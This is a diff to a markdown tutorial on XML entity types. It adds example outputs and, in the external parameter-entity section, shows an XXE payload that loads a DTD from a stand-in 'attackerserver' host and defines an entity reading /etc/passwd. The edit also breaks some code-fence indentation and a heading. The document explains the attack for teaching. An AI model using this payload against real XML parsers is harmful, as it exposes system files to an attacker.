@@ -111,6 +111,14 @@ Note: It has to be defined before any XML document node begin. This means that w
    <sample>I would like to say &entityname; &entityname2;</sample>
    ```
 
+   Output:
+
+   ```xml
+   <sample>I would like to say Hello World</sample>
+   ```
+
+   
+
 2. **External Entity**
 
    Definition:
@@ -129,6 +137,24 @@ Note: It has to be defined before any XML document node begin. This means that w
        <second>&includeme2;</second>
    </sample>
    ```
+
+   include.xml:
+
+   ```xml
+   <body>I am to be included.</body>
+   ```
+
+   Output:
+
+   ```xml
+   <sample>
+       <head>Header</head>
+       <first><body>I am to be included.</body></first>
+       <second><body>I am to be included.</body></second>
+   </sample>
+   ```
+
+   
 
 3. **Parameter Entity**
 
@@ -169,33 +195,43 @@ Note: It has to be defined before any XML document node begin. This means that w
       </sample>
       ```
 
-   2. **External definition**
+      Output:
 
+      ```xml
+   <sample>
+          <first>I would like to say hello world</first>
+          <second>I would like to say hello world again.</second>
+      </sample>
+   ```
+   
+2. External definition**
+   
       External DTD file:
-
+   
       ```dtd
-      <!ENTITY callme SYSTEM "/etc/passwd">
+   <!ENTITY callme SYSTEM "/etc/passwd">
       ```
 
       Definition:
-
+   
       ```xml-dtd
       <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
-      %param1;
+   %param1;
       ```
 
       The above definition would fetch the definition of "callme" from an external server during run-time to be expanded in the following form:
-
+   
       ```xml-dtd
       <!ENTITY % param1 SYSTEM "http://attackerserver/evil.dtd">
       <!ENTITY callme SYSTEM "/etc/passwd">
       ```
-
+   
       Vulnerable call from original XML:
-
+   
       ```xml
       <sample>&callme;</sample>
       ```
+   
 
 ## Great Works by Others
 
